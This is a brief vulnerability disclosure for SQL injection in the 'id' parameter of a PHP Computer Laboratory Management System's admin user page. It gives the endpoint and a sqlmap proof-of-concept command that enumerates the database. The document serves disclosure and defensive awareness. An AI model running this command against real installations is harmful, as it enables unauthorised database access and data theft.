
# Computer-Laboratory-Management-System-SQLi-4-PoC
+ Exploit Author: Emirhan Mutlu
# Vendor Homepage
+ https://www.sourcecodester.com/php/17268/computer-laboratory-management-system-using-php-and-mysql.html
# Software Link
+ https://www.sourcecodester.com/php/17268/computer-laboratory-management-system-using-php-and-mysql.html
# Overview
+ A SQL Injection vulnerability in Computer Laboratory Management System allows attackers to execute arbitrary SQL commands on the database server and exfiltrate sensitive data.
# Vulnerability Details
+ Vulnerable Endpoint: /php-lms/admin/?page=user/manage_user&id=6
+ Parameter: id
# Description
+ The lack of proper input validation and sanitization on the 'id' parameter allows an attacker to craft SQL injection queries and gaining unauthorized access to the database.

# Proof of Concept (PoC) : 
+ `sqlmap -u "http://localhost/php-lms/admin/?page=user/manage_user&id=6" --batch --level 5 --risk 3 --dbms=mysql --current-db --threads 10`
